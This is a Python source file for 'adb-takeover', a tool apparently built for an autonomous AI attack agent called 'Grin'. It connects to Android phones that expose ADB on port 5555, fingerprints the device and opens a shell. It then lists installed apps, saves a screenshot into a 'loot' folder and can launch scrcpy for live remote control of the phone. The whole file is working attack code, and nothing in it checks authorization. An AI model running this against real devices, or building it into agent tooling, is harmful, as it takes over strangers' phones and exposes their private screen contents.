#!/usr/bin/env python3
"""Deterministic Android/ADB takeover helper (`adb-takeover`).

Grin reliably finds exposed ADB (port 5555) and gets a shell, but then flails like it's a CTF box
(hunts for /flag.txt that doesn't exist on a real phone) and never demonstrates the real impact of
owning an Android device. This helper does the takeover deterministically: connect to exposed ADB,
fingerprint the device, list user-installed apps, capture a screenshot as proof, and — with
`--mirror` — launch **scrcpy** for a live, fully-controllable screen mirror on the operator's
desktop. Same "give the model a deterministic capability" pattern as web-rce / ssh-loot.

Self-contained: uses the `adb` (and, for --mirror, `scrcpy`) binaries on the runner. Interaction /
collection only — never destructive (stays inside Grin's permanent no-impact/DoS line).

    adb-takeover --target 192.168.1.116                 # connect, fingerprint, list apps, screenshot
    adb-takeover --target 192.168.1.116 --mirror        # ...and open a live scrcpy mirror + control
"""
import argparse
import os
import shutil
import subprocess

# props that fingerprint the device (cheap, one getprop each)
_PROPS = [
    "ro.product.manufacturer", "ro.product.model", "ro.build.version.release",
    "ro.build.version.security_patch", "ro.product.cpu.abi",
]


def _run(argv, timeout=25, binary=False):
    return subprocess.run(argv, capture_output=True, text=not binary, timeout=timeout)


def connect(target: str, port: str) -> str:
    """adb connect; return the serial (host:port) used for all subsequent -s calls."""
    _run(["adb", "connect", f"{target}:{port}"], timeout=20)
    return f"{target}:{port}"


def fingerprint(serial: str) -> dict:
    fp = {}
    for k in _PROPS:
        r = _run(["adb", "-s", serial, "shell", "getprop", k])
        fp[k] = (r.stdout or "").strip()
    fp["id"] = (_run(["adb", "-s", serial, "shell", "id"]).stdout or "").strip()
    return fp


def user_apps(serial: str) -> list:
    r = _run(["adb", "-s", serial, "shell", "pm", "list", "packages", "-3"])
    return [ln.split(":", 1)[1].strip() for ln in (r.stdout or "").splitlines()
            if ln.startswith("package:")]


def screenshot(serial: str, out: str) -> str | None:
    """Pull a PNG screenshot — proof of access (and the real 'impact' on a phone)."""
    r = _run(["adb", "-s", serial, "exec-out", "screencap", "-p"], timeout=30, binary=True)
    if r.returncode == 0 and r.stdout:
        os.makedirs(os.path.dirname(out) or ".", exist_ok=True)
        with open(out, "wb") as f:
            f.write(r.stdout)
        return out
    return None


def launch_mirror(serial: str) -> str:
    """Open scrcpy detached so the live mirror+control window appears without blocking Grin."""
    if not shutil.which("scrcpy"):
        return "scrcpy NOT installed on the runner — install it (NixOS: pkgs.scrcpy; apt: scrcpy) to mirror"
    subprocess.Popen(
        ["scrcpy", "-s", serial, "--window-title", f"GRIN takeover · {serial}"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True,
    )
    return "scrcpy launched — live screen mirror + full mouse/keyboard control on the operator desktop"


def takeover(target: str, port: str = "5555", *, mirror: bool = False,
             screenshot_out: str = "/tmp/loot/adb-screen.png", do_screenshot: bool = True) -> dict:
    serial = connect(target, port)
    fp = fingerprint(serial)
    got_shell = "uid=" in fp.get("id", "")
    apps = user_apps(serial) if got_shell else []
    shot = screenshot(serial, screenshot_out) if (got_shell and do_screenshot) else None
    mirror_msg = launch_mirror(serial) if (got_shell and mirror) else None
    return {"serial": serial, "shell": got_shell, "fingerprint": fp,
            "apps": apps, "screenshot": shot, "mirror": mirror_msg}


def render(res: dict) -> str:
    fp = res["fingerprint"]
    if not res["shell"]:
        return f"[adb-takeover] connected to {res['serial']} but could NOT get a shell (ADB may be unauthorized)"
    lines = [
        f"=== ADB TAKEOVER · {res['serial']} ===",
        f"device : {fp.get('ro.product.manufacturer','?')} {fp.get('ro.product.model','?')}",
        f"android: {fp.get('ro.build.version.release','?')}  "
        f"patch {fp.get('ro.build.version.security_patch','?')}  abi {fp.get('ro.product.cpu.abi','?')}",
        f"shell  : {fp.get('id','')}",
        f"user apps ({len(res['apps'])}): {', '.join(res['apps']) or '(none — stock device)'}",
    ]
    if res["screenshot"]:
        lines.append(f"screenshot: {res['screenshot']}  (proof of access)")
    if res["mirror"]:
        lines.append(f"mirror : {res['mirror']}")
    return "\n".join(lines)


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(prog="adb-takeover", description="Android/ADB takeover + screen mirror")
    ap.add_argument("--target", required=True, help="target host/IP exposing ADB")
    ap.add_argument("--port", default="5555", help="ADB TCP port (default 5555)")
    ap.add_argument("--mirror", action="store_true",
                    help="launch a live scrcpy screen-mirror + remote control on the desktop")
    ap.add_argument("--screenshot", dest="screenshot_out", default="/tmp/loot/adb-screen.png",
                    help="where to save the proof screenshot")
    ap.add_argument("--no-screenshot", action="store_true", help="skip the screenshot")
    a = ap.parse_args(argv)
    res = takeover(a.target, a.port, mirror=a.mirror,
                   screenshot_out=a.screenshot_out, do_screenshot=not a.no_screenshot)
    print(render(res))
    return 0 if res["shell"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
